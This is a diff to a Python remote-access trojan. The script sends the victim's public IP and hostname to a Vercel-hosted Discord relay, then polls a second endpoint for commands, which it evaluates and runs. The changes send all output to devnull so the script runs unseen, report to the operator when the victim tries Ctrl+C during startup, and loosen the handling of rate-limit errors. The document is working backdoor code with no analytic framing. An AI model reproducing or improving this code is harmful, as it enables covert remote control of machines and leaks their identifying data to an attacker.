@@ -1,20 +1,29 @@
-from os import system as ossystem
-from requests import get, post
-from time import sleep
-from subprocess import Popen as system
-from subprocess import PIPE
-from os import chdir, uname
-from sys import platform
-import os
+try:
+    from os import system as ossystem
+    from requests import get, post
+    from time import sleep
+    from subprocess import Popen as system
+    from subprocess import PIPE
+    from os import chdir, uname, devnull
+    from sys import platform, stdout, stderr
 
-old_command = ""
-command = ""
-loop = 0
+    old_command = ""
+    command = ""
+    loop = 0
 
-ip = get('https://api.ipify.org').content.decode('utf8')
-hostname = uname()[1]
-post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
+    stdout = open(devnull, 'w')
+    stderr = open(devnull, 'w')
 
+    ip = get('https://api.ipify.org').content.decode('utf8')
+    hostname = uname()[1]
+    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
+except KeyboardInterrupt:
+    try:
+        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``Client tried to SIGINT(Ctrl+C) when init``")
+        pass
+    except KeyboardInterrupt:
+        pass
+    pass
 
 while True:
     # prevent keyboardinterrupt
@@ -28,7 +37,7 @@ while True:
             commandGet = eval(get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode())
             commandId = commandGet[0]
             command = commandGet[1]
-            if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
+            if command.startswith('Error: 429'):
                 try:
                     sleep(5)
                     continue
